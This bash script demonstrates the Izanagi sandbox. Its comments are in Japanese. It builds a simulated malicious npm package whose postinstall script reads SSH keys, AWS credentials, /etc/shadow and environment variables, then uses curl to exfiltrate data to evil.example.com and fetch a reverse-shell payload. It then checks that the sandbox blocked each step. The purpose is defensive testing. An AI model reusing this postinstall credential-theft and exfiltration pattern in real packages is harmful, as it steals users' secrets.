#!/bin/bash
set -euo pipefail

# Izanagi デモ: npm install のサプライチェーン攻撃をサンドボックスで防御する
#
# 使い方:
#   bash demo/run-inline.sh                  # QEMU バックエンド (デフォルト)
#   bash demo/run-inline.sh --container      # Apple Container バックエンド
#   bash demo/run-inline.sh --qemu           # QEMU バックエンド (明示)
#
# 前提条件:
#   QEMU:             ~/.izanagi/images/debian-aarch64.qcow2 が配置済み
#   Apple Container:  izanagi-vm イメージがビルド済み (./image/build.sh)

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$PROJECT_ROOT"

IZANAGI="$PROJECT_ROOT/target/release/izanagi"

# --- オプション解析 ---
BACKEND="qemu"
for arg in "$@"; do
    case "$arg" in
        --container) BACKEND="apple-container" ;;
        --qemu)      BACKEND="qemu" ;;
        -h|--help)
            echo "Usage: $0 [--qemu | --container]"
            exit 0
            ;;
        *)
            echo "Unknown option: $arg" >&2
            exit 1
            ;;
    esac
done

# --- 前提条件チェック ---
if [ ! -f "$IZANAGI" ]; then
    echo "Error: izanagi バイナリが見つかりません。'cargo build --release' を実行してください。" >&2
    exit 1
fi

if [ "$BACKEND" = "qemu" ] && [ ! -f "$HOME/.izanagi/images/debian-aarch64.qcow2" ]; then
    echo "Error: QEMU VM イメージが見つかりません。packer/README.md を参照してイメージをビルドしてください。" >&2
    exit 1
fi

# --- 稼働中インスタンスのチェック ---
is_izanagi_running() {
    local pid_file="$HOME/.izanagi/izanagi.pid"
    if [ -f "$pid_file" ]; then
        local pid
        pid="$(head -1 "$pid_file" 2>/dev/null || true)"
        if [ -n "${pid:-}" ] && kill -0 "$pid" 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

if is_izanagi_running; then
    echo "Error: 既に別の izanagi インスタンスが稼働中です。停止してからデモを実行してください。" >&2
    exit 1
fi

# --- シークレットファイルを自動生成（未設定の場合） ---
if [ -z "${IZANAGI_SECRET_FILE:-}" ]; then
    IZANAGI_SECRET_FILE=$(mktemp /tmp/izanagi-demo-secret-XXXXXX)
    chmod 0600 "$IZANAGI_SECRET_FILE"
    head -c 32 /dev/urandom | base64 > "$IZANAGI_SECRET_FILE"
    AUTO_SECRET=1
else
    AUTO_SECRET=0
fi
export IZANAGI_SECRET_FILE

# --- config 生成 ---
# tracer=none のためルールベースの検知 (SuspiciousPathRule 等) は動作しない。
# このデモはサンドボックスによる隔離（ファイル不在・権限拒否・ネットワーク遮断）を見せる。
CONFIG=$(mktemp /tmp/izanagi-demo-config-XXXXXX.toml)
chmod 0600 "$CONFIG"

if [ "$BACKEND" = "qemu" ]; then
    BACKEND_LABEL="QEMU VM"
    cat > "$CONFIG" << 'TOML'
[sandbox]
backend = "qemu"
tracer = "none"

[sandbox.qemu]
cpus = 2
memory = "2G"
image = "default"

[share]
paths = ["."]
mount_point = "/workspace"

# tracer=none のため以下は動作しないが、config パースに必要
[monitor]
syscalls = ["file", "network", "process", "env"]

[detect]
suspicious_paths = []
allowed_hosts = []
TOML
else
    BACKEND_LABEL="Apple Container"
    cat > "$CONFIG" << 'TOML'
[sandbox]
backend = "apple-container"
tracer = "none"

[sandbox.apple_container]
image = "izanagi-vm"

[share]
paths = ["."]
mount_point = "/workspace"

[monitor]
syscalls = ["file", "network", "process", "env"]

[detect]
suspicious_paths = []
allowed_hosts = []
TOML
fi

# --- クリーンアップ ---
cleanup() {
    rm -f "$CONFIG"
    [ "$AUTO_SECRET" = "1" ] && rm -f "$IZANAGI_SECRET_FILE"
    if ! is_izanagi_running; then
        rm -f "$HOME/.izanagi/izanagi.lock" "$HOME/.izanagi/izanagi.pid"
    fi
}
trap cleanup EXIT

# stale ファイルがあれば削除（稼働中でないことは上で確認済み）
rm -f "$HOME/.izanagi/izanagi.lock" "$HOME/.izanagi/izanagi.pid" "$HOME/.izanagi/session.json"

echo "============================================"
echo "  Izanagi デモ: サプライチェーン攻撃の検知"
echo "============================================"
echo ""
echo "バックエンド: $BACKEND_LABEL"
echo ""
echo "シナリオ: npm パッケージの postinstall スクリプトが"
echo "  1. ~/.ssh/id_rsa を読み取る"
echo "  2. ~/.aws/credentials を読み取る"
echo "  3. /etc/shadow を読み取る"
echo "  4. /proc/self/environ から環境変数を窃取する"
echo "  5. curl で窃取データを外部送信する"
echo "  6. curl でリバースシェル用ペイロードを取得する"
echo ""
echo "サンドボックス ($BACKEND_LABEL) がこれらをブロックできるか検証します。"
echo ""
echo "サンドボックスを起動中..."

EXEC_OUTPUT=$(IZANAGI_DEMO=1 "$IZANAGI" --config "$CONFIG" exec -- sh -c '
mkdir -p /tmp/demo/malicious-dep

echo "{\"name\":\"demo\",\"private\":true,\"dependencies\":{\"mal\":\"file:./malicious-dep\"}}" > /tmp/demo/package.json
echo "{\"name\":\"mal\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node postinstall.js\"}}" > /tmp/demo/malicious-dep/package.json

cat > /tmp/demo/malicious-dep/postinstall.js << "SCRIPT"
const os = require("os"), { execSync } = require("child_process");
let result = 0;
function run(bit, label, cmd) {
  console.log("\n\x1b[33m[attack " + label + "]\x1b[0m");
  console.log("\x1b[90m$ " + cmd + "\x1b[0m");
  try {
    const out = execSync(cmd, { timeout: 5000, encoding: "utf-8", stdio: ["pipe","pipe","pipe"] });
    if (out.trim()) console.log(out.trimEnd());
    console.log("\x1b[31m⚠ SUCCESS\x1b[0m");
    result |= (1 << bit);
  } catch (e) {
    const stderr = (e.stderr || "").trim();
    if (stderr) console.log(stderr);
    console.log("\x1b[32m✓ BLOCKED\x1b[0m");
  }
}
console.log("\x1b[1m=== Supply Chain Attack Simulation ===\x1b[0m");
console.log("user: " + os.userInfo().username + "  home: " + os.homedir());
run(0, "1: SSH 秘密鍵の窃取", "cat ~/.ssh/id_rsa");
run(1, "2: AWS クレデンシャルの窃取", "cat ~/.aws/credentials");
run(2, "3: /etc/shadow の読み取り", "cat /etc/shadow");
run(3, "4: 環境変数の窃取", "cat /proc/self/environ | tr '"'"'\\0'"'"' '"'"'\\n'"'"' | grep -E '"'"'^(SHELL=|LANG=|SSH_|AWS_|IZANAGI_DEMO)'"'"'");
run(4, "5: 窃取データの外部送信", "curl -s --max-time 3 -X POST -d stolen=ssh-key http://evil.example.com/exfil");
run(5, "6: リバースシェル用ペイロードの取得", "curl -s --max-time 3 http://evil.example.com/payload -o /tmp/payload");
console.log("\n\x1b[1m=== Simulation Complete ===\x1b[0m");
console.log("IZANAGI_DEMO_RESULT:" + result);
SCRIPT

cd /tmp/demo && npm install --no-audit --no-fund --foreground-scripts 2>&1
' 2>&1) && EXEC_RC=$? || EXEC_RC=$?

echo "$EXEC_OUTPUT"

if [ "$EXEC_RC" -ne 0 ] && [ "$EXEC_RC" -ne 1 ]; then
    echo "warning: izanagi exited with unexpected code: $EXEC_RC" >&2
fi

RESULT_BITS=$(echo "$EXEC_OUTPUT" | sed -n 's/.*IZANAGI_DEMO_RESULT:\([0-9]*\).*/\1/p' | tail -1)
if [ -z "$RESULT_BITS" ]; then
    echo "Error: デモの実行結果を取得できませんでした。サンドボックスの起動に失敗した可能性があります。" >&2
    exit 1
fi

ATTACK_LABELS=(
    "SSH 秘密鍵の窃取"
    "AWS クレデンシャルの窃取"
    "/etc/shadow の読み取り"
    "環境変数の窃取"
    "窃取データの外部送信"
    "リバースシェル用ペイロードの取得"
)
TOTAL=6
SUCCESS_COUNT=0
FAILED_ATTACKS=()
for i in $(seq 0 5); do
    if [ $(( RESULT_BITS & (1 << i) )) -ne 0 ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        FAILED_ATTACKS+=("${ATTACK_LABELS[$i]}")
    fi
done
BLOCKED_COUNT=$((TOTAL - SUCCESS_COUNT))

echo ""
echo "============================================"
echo "  デモ完了"
echo "============================================"
echo ""
echo "結果: $TOTAL 件中 $BLOCKED_COUNT 件ブロック / $SUCCESS_COUNT 件パススルー"
echo ""

if [ "$SUCCESS_COUNT" -eq 0 ]; then
    echo "サンドボックス ($BACKEND_LABEL) が全ての攻撃をブロックしました。"
    echo "ホストのファイルシステムには一切アクセスされていません。"
elif [ "$BLOCKED_COUNT" -gt 0 ]; then
    echo "サンドボックス ($BACKEND_LABEL) は一部の攻撃をブロックしましたが、"
    echo "$SUCCESS_COUNT 件の攻撃がサンドボックスを通過しました。"
    echo ""
    echo "⚠ 通過した攻撃:"
    for label in "${FAILED_ATTACKS[@]}"; do
        echo "  - $label"
    done
    echo ""
    if [ "$BACKEND" = "apple-container" ]; then
        echo "これは Apple Container の既知の問題です (https://github.com/apple/container/issues/1352)。"
    else
        echo "QEMU VM では /proc/self/environ へのアクセス制限が不十分な場合があります。"
        echo "izanagi-agent のバージョンを更新し、PR_SET_DUMPABLE による対策を適用してください。"
    fi
else
    echo "⚠ サンドボックス ($BACKEND_LABEL) は攻撃をブロックできませんでした。"
fi
